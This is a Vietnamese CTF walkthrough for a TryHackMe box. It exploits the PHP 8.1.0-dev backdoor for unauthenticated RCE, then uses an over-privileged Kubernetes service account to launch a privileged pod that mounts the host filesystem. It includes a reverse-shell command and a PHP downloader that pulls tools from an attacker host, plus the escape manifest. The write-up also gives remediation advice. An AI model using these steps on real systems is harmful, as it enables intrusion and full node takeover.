@@ -1,0 +1,216 @@
+---
+title: 'Frank and Herby try again.....'
+description: 'Một bản build PHP 8.1.0-dev bị cài backdoor cho RCE không cần xác thực bên trong một pod Kubernetes, và một service account quá nhiều quyền cho phép tạo một privileged pod mount filesystem của host để chiếm toàn bộ node.'
+date: 2026-01-09
+platform: tryhackme
+room: 'Frank and Herby try again.....'
+roomUrl: 'https://tryhackme.com/room/frankandherbytryagain'
+difficulty: medium
+tags:
+  - 'php'
+  - 'cve'
+  - 'rce'
+  - 'kubernetes'
+  - 'docker'
+  - 'container-escape'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'supply chain backdoor'
+  - 'insecure kubernetes rbac'
+  - 'privileged container escape'
+translation: done
+draft: false
+---
+
+## **Frank and Herby try again..... — Một Bản Build PHP Bị Cài Backdoor và Một Pod Kubernetes Chiếm Cả Node**
+
+_Một bài walkthrough cho box "Frank and Herby try again....." của TryHackMe. Một web server chạy bản build_ _`PHP 8.1.0-dev`_ _khét tiếng bị cài backdoor, cho RCE không cần xác thực — nhưng đưa ta vào với tư cách root_ bên trong một container*. Service account Kubernetes của container có thể làm mọi thứ (\`*._`trên mọi verb), nên ta tuồn`\*\*kubectl\` vào, tạo một privileged pod mount filesystem gốc của host, và bước thẳng ra node._
+
+> Flag và IP mục tiêu được ẩn. Đây là box huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên một mục tiêu luyện tập được cho phép. Flag hiển thị dạng `THM{<redacted>}` — có thật trên box nhưng ẩn ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Một web app trên cổng cao chạy bản build **`PHP 8.1.0-dev`** **bị cài backdoor** (backdoor chuỗi cung ứng từ git-server năm 2021, kích hoạt bằng header `User-Agentt` chế tác) → **RCE không cần xác thực với quyền root bên trong một container** → `env` lộ các biến service Kubernetes, và `kubectl auth can-i --list` cho thấy token của pod có thể làm **`*.*`** **với verb** **`*`** — kiểm soát toàn cluster → `kubectl`/`curl`/`wget` đều thiếu, nên ta nạp `kubectl` bằng cách cho PHP `file_get_contents` từ HTTP server của mình → đọc tên image của node, rồi `kubectl apply` một **privileged pod** với `hostPID`/`hostNetwork` **mount host** **`/`** **tại** **`/host`** → `kubectl exec` vào đó và đọc `user.txt` và `root.txt` từ filesystem thật của host.
+
+PHP bị backdoor → RCE trong container → RBAC thần thánh → privileged pod mount host root → chiếm node.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+Lượt quét bị các cổng control-plane của Kubernetes chiếm đa số (kubelet ở `10250`/`10255`, API server ở `16443`, scheduler/controller ở `10257`/`10259`) cộng SSH và một PHP dev server:
+
+```text
+22/tcp    open  ssh       OpenSSH 8.2p1 Ubuntu
+10250/tcp open  ssl/http  kubelet (microk8s)
+10255/tcp open  http      kubelet read-only
+16443/tcp open  ssl/http  Kubernetes API server (microk8s)
+30679/tcp open  http      PHP cli server 5.5+ (PHP 8.1.0-dev)  — "FRANK RULEZZ!"
+```
+
+Cái banner đó — **PHP 8.1.0-dev** — là toàn bộ nửa đầu của box. Một lượt quét nội dung dev server xác nhận có một `info.php` chi tiết.
+
+### **Lỗ hổng — một backdoor được nhét trong mã nguồn PHP**
+
+Tháng 3/2021, git server của chính dự án PHP bị xâm nhập và hai commit độc hại được đẩy lên, thêm một backdoor vào cây mã `8.1.0-dev`: nếu một request gửi đến mang header `User-Agentt` (hai chữ t) bắt đầu bằng `zerodium`, phần còn lại của header được thực thi bằng `eval()`. Bất kỳ server nào build từ mã nguồn nhiễm đó đều là **RCE không cần xác thực cho bất kỳ ai biết header**.
+
+<Callout type="insight">
+
+Đây không phải lỗi của app — đó là một **backdoor chuỗi cung ứng được nhét thẳng vào trình thông dịch**. Bài học nằm ở chỗ niềm tin bị phá vỡ: chính runtime bị can thiệp từ thượng nguồn, nên dù review ứng dụng kỹ đến đâu cũng không bắt được. Nhận ra nó hoàn toàn là việc đọc banner phiên bản và biết lịch sử của nó.
+
+</Callout>
+
+### **Bước 1 — RCE không cần xác thực qua backdoor**
+
+Dùng bất kỳ PoC công khai nào cho backdoor `8.1.0-dev` (ví dụ của flast101) để bắn một reverse shell:
+
+```text
+# attacker
+nc -lvnp 4444
+python3 revshell.py http://$IP:30679 $ATTACKER_IP 4444
+```
+
+Shell trả về với tư cách **root**, nhưng hostname (`php-deploy-...`) và một cái nhìn nhanh vào môi trường cho thấy ta đang ở bên trong một container, không phải trên host:
+
+```text
+root@php-deploy-6d998f68b9-...:/var/www/html# whoami
+root
+```
+
+### **Bước 2 — xác nhận Kubernetes và kiểm tra quyền**
+
+`env` làm lộ cấu hình service-account, nên pod này có nói chuyện với một Kubernetes API:
+
+```text
+env | grep -i kuber
+# KUBERNETES_SERVICE_HOST=10.152.183.1
+# KUBERNETES_SERVICE_PORT=443 ...
+```
+
+Nhưng `kubectl`, `curl`, và `wget` đều thiếu trong container. PHP là công cụ chắc chắn có, nên ta dùng nó để kéo `kubectl` từ HTTP server của mình:
+
+```text
+# attacker: host a kubectl binary
+curl -LO https://dl.k8s.io/release/v1.18.0/bin/linux/amd64/kubectl
+python3 -m http.server 8080
+```
+
+```text
+# in the pod: write a tiny PHP downloader and hit it
+echo '<?php' > foo.php
+echo '    file_put_contents("kubectl", file_get_contents("http://'$ATTACKER_IP':8080/kubectl"));' >> foo.php
+echo '?>' >> foo.php
+# request foo.php once, then:
+cp kubectl /tmp && cd /tmp && chmod +x kubectl
+```
+
+Có `kubectl` trong tay, kiểm tra quyền của service account:
+
+```text
+./kubectl auth can-i --list
+# Resources   Non-Resource URLs   Resource Names   Verbs
+# *.*         []                  []               [*]
+```
+
+**`*.*`** **trên verb** **`*`** — token của pod là cluster-admin trên thực tế.
+
+### **Bước 3 — tạo một privileged pod mount host**
+
+Ta cần tên image của node để pod mới schedule gọn gàng:
+
+```text
+./kubectl get node -o yaml | grep -A2 images
+# docker.io/vulhub/php:8.1-backdoor
+```
+
+Giờ định nghĩa một pod privileged, chia sẻ namespace của host, và **bind-mount filesystem gốc của host** vào container tại `/host`:
+
+```text
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwned
+  labels:
+    app: pwn
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: pwned
+    image: docker.io/vulhub/php:8.1-backdoor
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
+
+Nạp `pwn.yaml` theo cách giống như nạp `kubectl` (PHP `file_get_contents` từ HTTP server của mình), rồi apply nó:
+
+```text
+./kubectl apply -f pwn.yaml
+# pod/pwned created
+./kubectl get pods            # pwned ... Running
+```
+
+### **Bước 4 — bước ra node và đọc flag**
+
+Exec vào privileged pod và đi trên filesystem của host được mount ở `/host`:
+
+```text
+./kubectl exec -it pwned -- /bin/sh
+id                            # uid=0(root)
+cd /host/home/herby && cat user.txt
+# THM{<redacted>}
+cat /host/root/root.txt
+# THM{<redacted>}
+```
+
+Root của container chính là root của node — cái mount xóa bỏ ranh giới giữa "container" và "host".
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Hai thất bại nghiêm trọng độc lập chồng lại thành chiếm toàn bộ node:
+
+- **Một runtime PHP bị backdoor** cho thực thi mã từ xa, không cần xác thực, cho bất kỳ ai gửi header thần kỳ — chính trình thông dịch là độc hại.
+- **Một service account pod với RBAC** **`*.*`\*\***/\***_`_`** nghĩa là một container bị xâm nhập là cluster-admin. Kết hợp với quyền tạo **privileged pod với** **`hostPath: /`**, đó là một lệnh duy nhất để thoát ra mọi node — đọc mọi tệp, chạy mọi tiến trình, với quyền root trên host.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Đừng bao giờ chạy bản build PHP** **`-dev`** **hoặc không tin cậy trong production.** Găm vào các release tag chính thức với checksum/chữ ký đã xác minh, và build lại từ mã nguồn đã biết là tốt — backdoor `8.1.0-dev` là một vụ xâm nhập chuỗi cung ứng kinh điển.
+2. **Giới hạn service account theo đặc quyền tối thiểu.** Một web pod không cần quyền Kubernetes API nào cả; `*.*` trên `*` không bao giờ nên gắn vào token của một workload. Tắt tự động mount token mặc định khi không dùng.
+3. **Áp dụng Pod Security Admission / admission control.** Từ chối `privileged: true`, `hostPID`, `hostNetwork`, và mount `hostPath` cho các namespace ứng dụng để một pod bị xâm nhập không thể tạo một pod "anh em" thoát ra node.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Banner phiên bản chính là exploit.** `PHP 8.1.0-dev` không phải một CVE theo nghĩa thông thường — đó là một bản build bị backdoor, và nhận ra nó là toàn bộ foothold.
+- **Root trong container không phải root trên host.** Luôn kiểm tra `env`/hostname/`/proc` để biết mình thực sự đang ở đâu trước khi ăn mừng.
+- **RBAC mới là bề mặt tấn công thật trong Kubernetes.** Một token có thể tạo privileged pod tương đương với root trên mọi node, bất kể app được làm cứng đến đâu.
+- **`hostPath: /`** **+** **`privileged`** **= thoát ra ngay lập tức.** Mount node root vào một pod bạn kiểm soát xóa sạch ranh giới container.
+
+Cảm ơn bạn đã đọc. Frank và Herby "thử lại", nhưng box thật ra là hai thất bại về niềm tin xếp chồng: một runtime bị backdoor từ thượng nguồn, và một cluster trao cho một web pod chìa khóa của mọi node.
